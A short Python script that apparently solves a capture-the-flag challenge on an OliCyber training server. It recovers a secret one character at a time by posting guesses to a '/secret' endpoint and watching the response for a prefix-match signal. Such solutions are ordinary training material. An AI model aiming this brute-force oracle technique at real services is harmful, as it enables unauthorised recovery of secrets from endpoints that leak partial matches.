import requests, string
site = "http://delphi.challs.olicyber.it/"
l = list(string.ascii_letters + string.digits)
clue = "mmmmmmmmmmmmmmmmmmmmmm"
flag = ""
for i in range(len(clue)):
    for e in string.printable:
        r = requests.post(site + "secret", data={"secret":flag + e})
        if "..." in r.text:
            flag += e
            break
        if "ptm" in r.text:
            print(r.text)
            exit(0)
    print(flag)